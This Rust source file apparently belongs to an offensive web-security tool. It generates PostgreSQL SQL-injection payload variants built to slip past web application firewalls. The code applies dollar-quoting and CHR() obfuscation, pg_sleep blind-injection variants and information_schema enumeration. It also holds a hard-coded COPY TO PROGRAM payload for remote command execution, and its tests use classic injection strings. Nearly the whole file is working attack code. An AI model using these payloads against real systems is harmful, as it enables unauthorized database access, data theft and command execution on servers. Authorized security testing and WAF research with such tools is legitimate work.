//! PostgreSQL-specific SQL grammar mutations.
//!
//! PostgreSQL has unique features that enable WAF bypasses:
//! - Dollar-quoting (`$$string$$`, `$tag$string$tag$`)
//! - `::type` cast syntax
//! - `CHR()` function for character construction
//! - `string_agg()` for data concatenation
//! - `generate_series()` for row expansion
//! - `COPY TO PROGRAM` for RCE
//! - Array syntax (`'{1,2,3}'::int[]`)

/// Generate PostgreSQL-specific mutations for a payload.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
    let mut results = Vec::with_capacity(max_mutations);
    let lower = payload.to_ascii_lowercase();

    // ── Dollar-quoting for string literals ──
    // Replace single quotes with $$ — evades quote-escaping WAFs
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'')
    {
        let end = start + 1 + end;
        let inner = &payload[start + 1..end];
        results.push(format!(
            "{}$${}$${}",
            &payload[..start],
            inner,
            &payload[end + 1..]
        ));
        results.push(format!(
            "{}$tag${}$tag${}",
            &payload[..start],
            inner,
            &payload[end + 1..]
        ));
        // Custom tag to evade $$ detection
        results.push(format!(
            "{}$q${}$q${}",
            &payload[..start],
            inner,
            &payload[end + 1..]
        ));
    }

    // ── Cast syntax obfuscation ──
    if lower.contains("char") || lower.contains("varchar") {
        results.push(format!("{payload}::text"));
    }

    // ── pg_sleep time-based blind ──
    if lower.contains("sleep") {
        results.push(payload.replace("SLEEP(", "pg_sleep("));
        results.push(payload.replace("sleep(", "pg_sleep("));
        // Subquery variant — harder for WAFs to regex
        results.push(
            payload
                .replace("SLEEP(", "(SELECT pg_sleep(")
                .replace(')', "))"),
        );
    }

    // ── GENERATE_SERIES for row expansion ──
    if lower.contains("union") {
        results.push(format!("{payload} FROM generate_series(1,1)"));
    }

    // ── CHR() string building ──
    // Build strings from CHR() calls — no keywords visible
    if let Some(start) = payload.find('\'')
        && let Some(end) = payload[start + 1..].find('\'')
    {
        let inner = &payload[start + 1..start + 1 + end];
        if !inner.is_empty() && inner.len() <= 15 {
            let chr_chain: String = inner
                .chars()
                .map(|c| format!("CHR({})", c as u32))
                .collect::<Vec<_>>()
                .join("||");
            results.push(format!(
                "{}{}{}",
                &payload[..start],
                chr_chain,
                &payload[start + 1 + end + 1..]
            ));
        }
    }

    // ── Array literal injection ──
    if results.len() < max_mutations {
        results.push(format!(
            "{} AND 1=ANY(ARRAY[1])--",
            payload.trim_end_matches("--").trim_end_matches('#')
        ));
    }

    // ── string_agg for data exfiltration ──
    if lower.contains("select") && results.len() < max_mutations {
        results.push(payload.replace("SELECT ", "SELECT string_agg("));
    }

    // ── Information schema enumeration ──
    if results.len() < max_mutations {
        let base = payload.trim_end_matches("--").trim_end_matches('#');
        results.push(format!(
            "{base} UNION SELECT table_name,NULL FROM information_schema.tables--"
        ));
    }

    // ── COPY TO PROGRAM (RCE) ──
    if results.len() < max_mutations {
        results.push("'; COPY (SELECT '') TO PROGRAM 'id'--".to_string());
    }

    // ── E'escape' string syntax ──
    if let Some(start) = payload.find('\'')
        && results.len() < max_mutations
    {
        let mut escaped = payload.to_string();
        escaped.insert(start, 'E');
        results.push(escaped);
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn dollar_quote_generated() {
        let mutations = mutate("' OR 'a'='a'--", 50);
        assert!(mutations.iter().any(|m| m.contains("$$")));
    }

    #[test]
    fn custom_tag_dollar_quote() {
        let mutations = mutate("' OR 'a'='a'--", 50);
        assert!(mutations.iter().any(|m| m.contains("$q$")));
    }

    #[test]
    fn chr_chain_generated() {
        let mutations = mutate("' OR 'admin'='admin'--", 50);
        assert!(mutations.iter().any(|m| m.contains("CHR(")));
    }

    #[test]
    fn array_injection() {
        let mutations = mutate("' OR 1=1--", 50);
        assert!(mutations.iter().any(|m| m.contains("ANY(ARRAY")));
    }

    #[test]
    fn e_escape_string() {
        let mutations = mutate("' OR 1=1--", 50);
        assert!(mutations.iter().any(|m| m.contains("E'")));
    }

    #[test]
    fn pg_sleep_subquery() {
        let mutations = mutate("SLEEP(5)", 50);
        assert!(mutations.iter().any(|m| m.contains("pg_sleep")));
    }
}
